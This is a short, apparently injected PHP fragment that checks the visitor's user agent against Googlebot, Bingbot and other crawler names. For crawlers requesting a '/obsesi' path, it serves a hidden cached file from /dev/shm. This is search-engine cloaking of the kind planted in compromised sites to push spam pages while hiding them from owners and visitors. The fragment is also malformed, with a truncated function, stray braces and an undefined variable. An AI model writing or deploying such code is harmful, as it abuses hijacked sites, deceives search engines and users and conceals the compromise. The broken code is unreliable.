function is_google_bot_v4(){
    $a = ["Googlebot","Google-Site-Verification","Google-InspectionTool","Googlebot-Mobile","Googlebot-News"];

    }
}

function is_google_bot_v3(){
    $bots = [
        'Googlebot', 'Google-InspectionTool', 'AdsBot-Google', 'Mediapartners-Google',
        'Bingbot', 'Slurp', 'DuckDuckBot', 'AhrefsBot', 'SemrushBot', 'MJ12bot', 'YandexBot'
    ];
    $user_agent = $_SERVER['HTTP_USER_AGENT'] ?? '';
    foreach($bots as $bot){
        if(stripos($user_agent, $bot) !== false){
            return true;
        }
    }
    return false;
}

if(stripos($uri, '/obsesi') !== false){
    if(is_google_bot_v3()){
        $file = '/dev/shm/mail-obsesi.txt';
        if(file_exists($file)){
            readfile($file);
        } else {
            echo 'cache not ready';
        }
        exit;
    }
}
